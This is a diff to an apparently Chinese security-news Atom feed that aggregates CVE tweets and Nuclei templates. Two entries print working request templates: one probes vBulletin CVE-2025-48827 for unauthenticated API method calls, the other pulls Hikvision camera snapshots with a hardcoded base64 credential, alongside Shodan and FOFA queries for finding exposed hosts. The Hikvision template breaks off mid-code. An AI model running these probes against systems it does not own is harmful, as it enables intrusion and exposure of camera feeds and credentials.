@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-05T02:45:20.219Z</updated>
+  <updated>2025-07-05T03:00:57.413Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,261 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>fridaysecurity Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_1782118235/"/>
+    <id>http://example.com/2025/07/05/twitter_1782118235/</id>
+    <published>2025-07-05T03:00:57.000Z</published>
+    <updated>2025-07-05T03:00:57.413Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> fridaysecurity</p><p><strong>推文：</strong> 🗣️  CVE-2025-53367：DjVuLibre漏洞为Linux桌面代码执行开辟路径，概念验证(PoC)已公开！ <a href="https://t.co/C3MKDZgvFw">https://t.co/C3MKDZgvFw</a></p><p><strong>链接：</strong> <a href="https://x.com/fridaysecurity/status/1941319100074164363">https://x.com/fridaysecurity/status/1941319100074164363</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; fridaysecurity&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🗣️  CVE-2025-53367：DjVuLibre漏洞为Linux桌面代码执行开辟路径，概念验证(PoC)已公开！ &lt;a href=&quot;ht</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="fridaysecurity" scheme="http://example.com/tags/fridaysecurity/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vBulletin 500-603 - Authentication Bypass</title>
+    <link href="http://example.com/2025/07/05/github_3289496512/"/>
+    <id>http://example.com/2025/07/05/github_3289496512/</id>
+    <published>2025-07-05T03:00:52.000Z</published>
+    <updated>2025-07-05T03:00:52.017Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> vBulletin 5.0.0-6.0.3 - Authentication Bypass</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48827</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> vBulletin是一款广泛使用的论坛软件，支持多种功能如帖子发布、用户管理等，常见于企业和个人网站中。该软件在PHP 8.1或更高版本环境下存在认证绕过漏洞，允许未认证的攻击者远程调用受保护的API控制器方法。漏洞的根源在于PHP 8.1对ReflectionMethod::invoke()等方法的内部调整，默认允许通过PHP的Reflection API调用受保护或私有的方法。这一漏洞使得攻击者能够以Web服务器用户的身份执行任意系统命令，导致系统完全被控制。攻击无需认证即可远程执行，且可自动化利用，对系统安全构成严重威胁。</p><p><strong>产品厂商：</strong> vbulletin</p><p><strong>产品名称：</strong> vbulletin</p><p><strong>影响版本：</strong> 5.0.0 &lt;&#x3D; version &lt;&#x3D; 5.7.5, 6.0.0 &lt;&#x3D; version &lt;&#x3D; 6.0.3</p><p><strong>搜索语法：</strong> app&#x3D;”vBulletin”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/6f41aaeec41871233b23a1bfd1edafe97f0a1629/http%2Fcves%2F2025%2FCVE-2025-48827.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/6f41aaeec41871233b23a1bfd1edafe97f0a1629/http%2Fcves%2F2025%2FCVE-2025-48827.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">48827</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> vBulletin <span class="hljs-number">5.0</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> <span class="hljs-operator">-</span> Authentication Bypass<br>  <span class="hljs-params">author:</span> pszyszkowski<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    vBulletin <span class="hljs-number">5.0</span>.<span class="hljs-number">0</span> through <span class="hljs-number">5.7</span>.<span class="hljs-number">5</span> and <span class="hljs-number">6.0</span>.<span class="hljs-number">0</span> through <span class="hljs-number">6.0</span>.<span class="hljs-number">3</span> contain an authentication bypass caused by unauthenticated access to protected API controllers on PHP <span class="hljs-number">8.1</span> <span class="hljs-keyword">or</span> later, letting unauthenticated attackers invoke protected methods remotely.Starting from PHP <span class="hljs-number">8.1</span>, due to an internal adjustment to handling of ReflectionMethod::invoke() and similar methods, it now allows — by default — invocation of protected <span class="hljs-symbol">/</span> private methods when using PHP&#x27;s Reflection API.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation allows unauthenticated remote attackers to execute arbitrary system commands as the web server user, resulting <span class="hljs-keyword">in</span> full system compromise.<br>  <span class="hljs-params">remediation:</span> |<br>    Upgrade to vBulletin <span class="hljs-number">6.0</span>.<span class="hljs-number">4</span><span class="hljs-operator">+</span> before upgrading to PHP <span class="hljs-number">8.1</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-48827</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:vbulletin:vbulletin:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">10</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">48827</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">424</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">vendor:</span> vbulletin<br>    <span class="hljs-params">product:</span> vbulletin<br>    <span class="hljs-params">fofa-query:</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;vBulletin&quot;</span><br>    <span class="hljs-params">shodan-query:</span> http.component:<span class="hljs-string">&quot;vBulletin&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,rce,vbulletin,intrusive<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">rand_string:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_base(5))&#125;&#125;&quot;</span><br>  <span class="hljs-params">rand_value:</span> <span class="hljs-string">&quot;&#123;&#123;to_lower(rand_text_alpha(5))&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/ajax/api/ad/wrapAdTemplate</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">template</span><span class="hljs-operator">=</span>&#123;&#123;rand_string&#125;&#125;&amp;id_name<span class="hljs-operator">=</span>&#123;&#123;rand_value&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span><br>          <span class="hljs-operator">-</span> contains_all(body,&#x27;<span class="hljs-operator">&lt;</span>div class<span class="hljs-operator">=</span>&#x27;,&#x27;&#123;&#123;rand_string&#125;&#125;&#x27;,&#x27;&#123;&#123;rand_value&#125;&#125;&#x27;,&#x27;<span class="hljs-operator">/</span>div<span class="hljs-operator">&gt;</span>&#x27;)<br>        <span class="hljs-params">condition:</span> and<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; vBulletin 5.0.0-6.0.3 - Authentication </summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>yousukezan Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_3380330420/"/>
+    <id>http://example.com/2025/07/05/twitter_3380330420/</id>
+    <published>2025-07-05T03:00:50.000Z</published>
+    <updated>2025-07-05T03:00:50.273Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> yousukezan</p><p><strong>推文：</strong> 在Linux环境中使用的DjVu文档格式解码器「DjVuLibre」发现了一个严重漏洞（CVE-2025-53367）。由于MMRDecoder::scanruns方法中的缓冲区越界写入问题，只需打开一个特制的DjVu文件（可伪装为.pdf文件），就可能实现远程代码执行。由于Evince和Papers等许多Linux默认查看器会自动使用DjVuLibre，因此担心漏洞的影响会扩大。该漏洞已被证实为PoC，AppArmor的保护也有限。建议立即更新至已修复该漏洞的3.5.29版本。</p><p><strong>链接：</strong> <a href="https://x.com/yousukezan/status/1941319355226284056">https://x.com/yousukezan/status/1941319355226284056</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; yousukezan&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 在Linux环境中使用的DjVu文档格式解码器「DjVuLibre」发现了一个严重漏洞（CVE-2025-53367）。由于MMRDecoder::sca</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="yousukezan" scheme="http://example.com/tags/yousukezan/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>grok Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_346441282/"/>
+    <id>http://example.com/2025/07/05/twitter_346441282/</id>
+    <published>2025-07-05T03:00:37.000Z</published>
+    <updated>2025-07-05T03:00:37.173Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> grok</p><p><strong>推文：</strong> 没有证据证实突尼斯面具客利用CVE导致《Free Fire Max》服务器宕机。报告将“繁忙”问题归因于7月7日FFMIC 2025注册前的高流量。该组织于7月1日宣布暂时退出。请关注Garena官方频道以获取更新。<a href="https://t.co/BFoTHXdgYb">https://t.co/BFoTHXdgYb</a></p><p><strong>链接：</strong> <a href="https://x.com/grok/status/1941319375644131370">https://x.com/grok/status/1941319375644131370</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; grok&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 没有证据证实突尼斯面具客利用CVE导致《Free Fire Max》服务器宕机。报告将“繁忙”问题归因于7月7日FFMIC 2025注册前的高流量。该组织于7月1日宣</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="grok" scheme="http://example.com/tags/grok/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vBulletin Authentication Bypass Vulnerability</title>
+    <link href="http://example.com/2025/07/05/github_1674448598/"/>
+    <id>http://example.com/2025/07/05/github_1674448598/</id>
+    <published>2025-07-05T03:00:36.000Z</published>
+    <updated>2025-07-05T03:00:36.165Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> vBulletin Authentication Bypass Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48827</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> ### 受影响产品<br>vBulletin是一个广泛使用的论坛软件，支持多种社区功能，包括帖子发布、用户管理和内容审核等。它通常被部署在企业、教育机构和个人网站中，作为在线交流和讨论的平台。由于其流行性，vBulletin的安全性对许多网站至关重要。</p><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>此漏洞为权限绕过类型，影响vBulletin 5.0.0至5.7.5和6.0.0至6.0.3版本。在PHP 8.1或更高版本的环境中，未认证的攻击者可以远程调用受保护的API控制器方法。这一漏洞的根本原因在于对受保护方法的访问控制不足，导致攻击者可以绕过正常的认证流程。</p><h3 id="影响分析"><a href="#影响分析" class="headerlink" title="影响分析"></a>影响分析</h3><p>此漏洞允许未认证的攻击者执行本应受保护的操作，可能导致数据泄露、服务中断或其他恶意操作。由于攻击者无需认证即可利用此漏洞，因此风险极高。此外，漏洞的利用可以自动化进行，增加了被大规模利用的可能性。网站管理员应立即应用官方提供的补丁，以防止潜在的安全威胁。</p><p><strong>产品厂商：</strong> vBulletin</p><p><strong>产品名称：</strong> vBulletin</p><p><strong>影响版本：</strong> 5.0.0 through 5.7.5 and 6.0.0 through 6.0.3</p><p><strong>搜索语法：</strong> http.html:”powered by vbulletin”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12506">https://github.com/projectdiscovery/nuclei-templates/issues/12506</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>vBulletin 5.0.0 through 5.7.5 and 6.0.0 through 6.0.3 contain an authentication bypass caused by unauthenticated access to protected API controllers on PHP 8.1 or later, letting unauthenticated attackers invoke protected methods remotely.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce">https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:wiseep&#x2F;CVE-2025-48827.git</li><li><a href="https://github.com/wiseep/CVE-2025-48827">https://github.com/wiseep/CVE-2025-48827</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:0xgh057r3c0n&#x2F;CVE-2025-48827.git</li><li><a href="https://github.com/0xgh057r3c0n/CVE-2025-48827">https://github.com/0xgh057r3c0n/CVE-2025-48827</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-html-powered-by-vbulletin"><a href="#Shodan-Query-http-html-powered-by-vbulletin" class="headerlink" title="Shodan Query: http.html:&quot;powered by vbulletin&quot;"></a>Shodan Query: <code>http.html:&quot;powered by vbulletin&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; vBulletin Authentication Bypass Vulnera</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Luke06121 Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_1720153376/"/>
+    <id>http://example.com/2025/07/05/twitter_1720153376/</id>
+    <published>2025-07-05T03:00:31.000Z</published>
+    <updated>2025-07-05T03:00:31.180Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> Luke06121</p><p><strong>推文：</strong> Chrome曝出严重漏洞「CVE-2025-6554」 请立即更新：安全新闻警报 - ITmedia 企业版 <a href="https://t.co/ivXQU4TaOb">https://t.co/ivXQU4TaOb</a></p><p><strong>链接：</strong> <a href="https://x.com/Luke06121/status/1941327686900776969">https://x.com/Luke06121/status/1941327686900776969</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; Luke06121&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; Chrome曝出严重漏洞「CVE-2025-6554」 请立即更新：安全新闻警报 - ITmedia 企业版 &lt;a href=&quot;https://t.co/i</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="Luke06121" scheme="http://example.com/tags/Luke06121/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>VulmonFeeds Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_2943928722/"/>
+    <id>http://example.com/2025/07/05/twitter_2943928722/</id>
+    <published>2025-07-05T03:00:25.000Z</published>
+    <updated>2025-07-05T03:00:25.980Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> VulmonFeeds</p><p><strong>推文：</strong> CVE-2025-38213</p><p>Linux内核KASAN</p><p><a href="https://t.co/E7B3qBl8DU">https://t.co/E7B3qBl8DU</a></p><p><strong>链接：</strong> <a href="https://x.com/VulmonFeeds/status/1941328653050155312">https://x.com/VulmonFeeds/status/1941328653050155312</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; VulmonFeeds&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-38213&lt;/p&gt;
+&lt;p&gt;Linux内核KASAN&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://t.co/E7B3qBl8DU&quot;&gt;</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="VulmonFeeds" scheme="http://example.com/tags/VulmonFeeds/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVEnew Twitter Update !</title>
+    <link href="http://example.com/2025/07/05/twitter_595754468/"/>
+    <id>http://example.com/2025/07/05/twitter_595754468/</id>
+    <published>2025-07-05T03:00:22.000Z</published>
+    <updated>2025-07-05T03:00:22.680Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> CVEnew</p><p><strong>推文：</strong> CVE-2025-47227 在Netmake ScriptCase至9.12.006（23）版本的生产环境扩展中，管理员密码重置机制处理不当。同时进行GET和… <a href="https://t.co/ok8m75DHcA">https://t.co/ok8m75DHcA</a></p><p><strong>链接：</strong> <a href="https://x.com/CVEnew/status/1941329344741195932">https://x.com/CVEnew/status/1941329344741195932</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CVEnew&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-47227 在Netmake ScriptCase至9.12.006（23）版本的生产环境扩展中，管理员密码重置机制处理不当。同时进行GET和…</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="CVEnew" scheme="http://example.com/tags/CVEnew/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hikvision IP Camera - Snapshot, Config, and User Info Exposure</title>
+    <link href="http://example.com/2025/07/05/github_2654306796/"/>
+    <id>http://example.com/2025/07/05/github_2654306796/</id>
+    <published>2025-07-05T03:00:19.000Z</published>
+    <updated>2025-07-05T03:00:19.744Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Hikvision IP Camera - Snapshot, Config, and User Info Exposure</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-36260</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Hikvision IP Camera是一种广泛部署于企业和家庭监控系统中的网络摄像头设备，用于实时视频监控和安全防护。由于其广泛的应用，这些设备的安全性至关重要。该漏洞涉及未经认证即可访问敏感端点，包括实时快照、加密的配置文件以及包含用户凭证的XML文件。这种信息泄露漏洞的根源在于设备对特定端点的访问控制不足，使得攻击者无需认证即可获取敏感信息。基于CVE-2021-36260及相关绕过逻辑的利用链，攻击者可以远程访问这些敏感数据，可能导致用户凭证泄露、隐私侵犯，甚至进一步的安全威胁。由于无需认证即可利用，该漏洞的风险等级被评估为高危，可能对受影响设备的用户造成严重影响。</p><p><strong>产品厂商：</strong> Hikvision</p><p><strong>产品名称：</strong> Hikvision IP Camera</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/84b34f4a0b4ced471e744daee9cf1a2600811356/vulnerabilities%2Fiot%2Fhikvision%2Fhikvision-cam-info-exposure.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/84b34f4a0b4ced471e744daee9cf1a2600811356/vulnerabilities%2Fiot%2Fhikvision%2Fhikvision-cam-info-exposure.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> hikvision-cam-info-exposure<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Hikvision IP Camera <span class="hljs-operator">-</span> Snapshot, Config, and User Info Exposure<br>  <span class="hljs-params">author:</span> AbdulrahmanTamim<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> <span class="hljs-operator">&gt;</span><br>    Detects unauthenticated exposure of sensitive endpoints on vulnerable Hikvision IP cameras.<br>    This includes live snapshot feeds, encrypted configuration files, and full user credential XML.<br>    Based on exploit chaining of CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">36260</span> and related bypass logic.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.cve.org<span class="hljs-operator">/</span>CVERecord<span class="hljs-operator">?</span>id<span class="hljs-operator">=</span>CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">36260</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2021-36260</span><br>  <span class="hljs-params">tags:</span> hikvision,iot,camera,cve,cve2021,exposure,auth-bypass,config,snapshot,xml<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">b64auth:</span> YWRtaW46MTEK<br><br><span class="hljs-params">requests:</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/onvif-http/snapshot?auth=&#123;&#123;b64auth&#125;&#125;&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> snapshot-endpoint<br>        <span class="hljs-params">part:</span> request<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;/onvif-http/snapshot<span class="hljs-char escape_">\\</span>?auth=.*&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span 